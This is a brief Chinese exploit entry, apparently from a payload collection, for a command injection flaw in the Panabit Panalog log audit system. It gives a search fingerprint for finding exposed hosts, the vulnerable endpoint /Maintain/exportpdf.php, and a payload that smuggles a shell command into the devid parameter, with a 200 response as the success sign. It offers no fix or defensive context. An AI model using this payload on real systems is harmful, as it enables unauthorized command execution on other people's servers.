# PanabitPanalog大数据日志审计系统命令执行漏洞

PanabitPanalog ｜ 命令执行 ｜ —
- **指纹**：`app="Panabit-Panalog"`
- **请求**：`POST /Maintain/exportpdf.php HTTP/1.1`

**Payload**
```
devid=';ping www.baidu.com;
```
- **响应特征**：200